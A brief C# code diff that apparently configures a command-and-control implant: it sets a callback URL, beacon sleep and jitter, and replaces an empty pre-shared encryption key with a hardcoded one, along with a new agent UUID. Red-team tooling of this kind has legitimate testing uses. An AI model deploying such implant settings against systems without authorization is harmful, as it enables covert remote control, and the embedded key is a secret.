@@ -44,13 +44,13 @@ namespace Athena
             this.url = $"{callbackHost}:{callbackPort}/{this.endpoint}";
             this.userAgent = "";
             this.hostHeader = "";
-            this.psk = "";
+            this.psk = "304Tk+6ZF1Hb/07Wvi5JvkHjvuuuUF95YTnrTbqWq5U=";
             this.encryptedExchangeCheck = bool.Parse("false");
             int sleep = int.TryParse("3", out sleep) ? sleep : 60;
             this.sleep = sleep;
             int jitter = int.TryParse("3", out jitter) ? jitter : 10;
             this.jitter = jitter;
-            this.uuid = "fd050dd6-ed20-45a6-90f5-1ef9d6a1caa6";
+            this.uuid = "3839b8f5-72db-4aea-84e3-343c494a16f7";
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(this.uuid, this.psk);
